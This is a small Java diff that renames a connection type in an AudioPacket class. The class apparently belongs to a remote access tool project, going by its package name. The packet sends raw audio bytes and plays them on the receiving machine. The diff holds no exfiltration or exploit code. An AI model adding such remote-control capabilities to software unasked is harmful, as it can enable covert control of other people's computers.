@@ -4,7 +4,7 @@ import java.io.File;
 
 import de.sogomn.engine.fx.Sound;
 import de.sogomn.engine.util.FileUtils;
-import de.sogomn.rat.ActiveClient;
+import de.sogomn.rat.ActiveConnection;
 
 public final class AudioPacket implements IPacket {
 	
@@ -23,13 +23,13 @@ public final class AudioPacket implements IPacket {
 	}
 	
 	@Override
-	public void send(final ActiveClient client) {
+	public void send(final ActiveConnection client) {
 		client.writeInt(data.length);
 		client.write(data);
 	}
 	
 	@Override
-	public void receive(final ActiveClient client) {
+	public void receive(final ActiveConnection client) {
 		final int length = client.readInt();
 		
 		data = new byte[length];
@@ -38,7 +38,7 @@ public final class AudioPacket implements IPacket {
 	}
 	
 	@Override
-	public void execute(final ActiveClient client) {
+	public void execute(final ActiveConnection client) {
 		final Sound sound = Sound.loadSound(data);
 		
 		sound.play();
